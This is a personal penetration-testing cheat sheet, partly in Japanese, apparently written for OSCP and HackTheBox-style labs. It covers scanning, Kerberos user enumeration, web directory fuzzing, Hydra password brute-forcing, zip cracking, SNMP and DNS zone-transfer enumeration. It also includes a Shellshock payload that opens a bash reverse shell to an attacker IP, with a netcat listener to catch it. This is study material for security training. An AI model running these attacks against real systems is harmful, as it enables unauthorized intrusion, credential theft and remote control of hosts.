# CHEAT_SHEET

AD Enumeration & Attacks
https://raphaelrichard-sec.fr/learning-notes/ad-enumeration-attacks

Metasploit Reverseshell tips
https://gist.github.com/dejisec/8cdc3398610d1a0a91d01c9e1fb02ea1

### NetWorkSetting

```
echo "10.10.11.202 sequel.htb dc.sequel.htb" | sudo tee -a /etc/hosts
```

### chisel

```
やられ側の127.0.0.1:8080のhttpをkali側で見る

kali側
chisel server --port 8090 --reverse

やられ側(chiselの8090に接続して、やられ側の8080をkaliの8085に転送する)
chisel client 192.168.45.121:8090 R:8085:127.0.0.1:8080

firefoxでhttp://127.0.0.1:8085でアクセスする
```

### RustScan  
```

rustscan -a 10.10.10.15 --ulimit 5000 -- -sV -A -oN rustscan.txt  

```

### Nmap

```
デフォルトスキャン
sudo nmap -sV -sU -A -Pn -T4 192.168.243.149
sudo nmap -sV -sT -A -Pn -T4 192.168.243.149
nmap -T4 -A -v 10.10.10.161

krb5-enum-users
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='hokkaido-aerospace.com' 192.168.121.40 -Pn
nmap -p 88 --script krb5-enum-users --script-args="krb5-enum-users.realm='hokkaido-aerospace.com',userdb=/usr/share/wordlists/seclists/Usernames/Names/names.txt" 192.168.121.40 -Pn

脆弱性スキャン
nmap -sV --script vuln 10.10.10.1

スウィープスキャン
$nmap -sn 10.10.10.1-254

udp top20 --reason
$ sudo nmap -sU --top-ports 20 -T5 192.168.225.222 --reason

内部探索スキャン(内部スキャンには-sTを指定すること)
sudo nmap -nv -Pn -T5 -sC -sV -sT 10.10.x.148 --open --reason --version-all
proxychains -q nmap -sT 10.10.83.148
```

TCPのフルスキャン

```
nmap -A -sV -sC -T4 10.10.10.175 -p- -oN full_tcp.nmap
```

```
TFTPのenum(ファイル名検索)
sudo nmap -n -Pn -sU -p69 --script tftp-enum 192.168.221.222
```

### feroxbuster

```
BIG.txt (こっちの方が最強かも)
feroxbuster --url http://192.168.157.116 --wordlist /usr/share/wordlists/SecLists-master/Discovery/Web-Content/big.txt -x php,html,txt,jsp,asp,aspx,sh,conf,pl,bak,zip,gz,js,config,cgi -t 200

raft-medium-directories.txt (big.txtで見つけられなかったら用)
feroxbuster -u http://192.168.209.153:8000/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,jsp,asp,aspx,sh,conf,pl,bak,zip,gz,js,config -t 200
```

### FFuF

```
ffuf -u http://oscpexam.com:443/api/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt

or

ffuf -u http://192.168.201.13/management/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --recursion --recursion-depth=2
```

### ディレクトリ探索ワードリスト

```
メイン
/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt

サブ
/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

### FFuFでサブドメインをスキャンする

```
ffuf -u http://10.10.11.18 -H "Host: FUZZ.usage.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
```


### gobuster  
```
gobuster dir -u http://192.168.191.141 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k -x bak,php,zip,rar,txt,html,js,pdf,asp,aspx


gobuster dir -u http://10.10.10.6 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k -o popcorn.gobuster

また、httpsも探索をかけること
gobuster dir -u https://10.10.10.6 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k -o popcorn.gobuster
```

### Hydra
```
hydra -l(固定ユーザーネーム) -L(ユーザーネームリスト） -P(パスワードリスト) http-[get|post\|etc]-form :/入力変数=^入力値^ :失敗メッセージ
hydra -l admin' # -P /usr/share/wordlists/rockyou.txt admin.cronos.htb http-post-form "/:password=^PASS^:Login Failed"

hydra -l admin  -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid"

デフォルトパスワード総当たり
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.246.56 ftp

ftpでコマンドが実行されない場合:
ftp> passive
```

### zipcrack
```
zip2john 16162020_backup.zip > 16162020_backup.zip.john
john 16162020_backup.zip.john --wordlist=/usr/share/wordlists/rockyou.txt 
```

### SNMP

```
$ snmpwalk -v2c -c public 192.168.194.149 NET-SNMP-EXTEND-MIB::nsExtendObjects

$ snmpwalk -v 2c -c public monitored.htb | tee snmp_data
```

### ShellShock

```
() { :;}; /bin/bash -i >& /dev/tcp/10.10.14.3/4444 0>&1
```

### DNSの探索
```
dig axfr @10.10.10.13 cronos.htb
```


### 権限昇格nc(?)

```
nc -lnvp 4444

#nc -lvnp 4444でささらなかったから念のため
```

### pyenv

```
pyenv versions

ローバルで使用するPythonバージョンを設定する
pyenv global 3.9.5 2.7.18 1.5.2
これにより、システム全体でPython 3.9.5がデフォルトで使用され、python2コマンドでPython 2.7.18、python1コマンドでPython 1.5.2（利用可能な場合）が使用されます。


特定のディレクトリで特定のPythonバージョンを使用したい場合は、そのディレクトリで以下のコマンドを実行します
pyenv local 2.7.18  # Python 2.7.18を使用



環境の管理
仮想環境を作成: pyenv virtualenv 3.9.5 myenv
仮想環境を有効化: pyenv activate myenv
仮想環境を無効化: pyenv deactivate
```
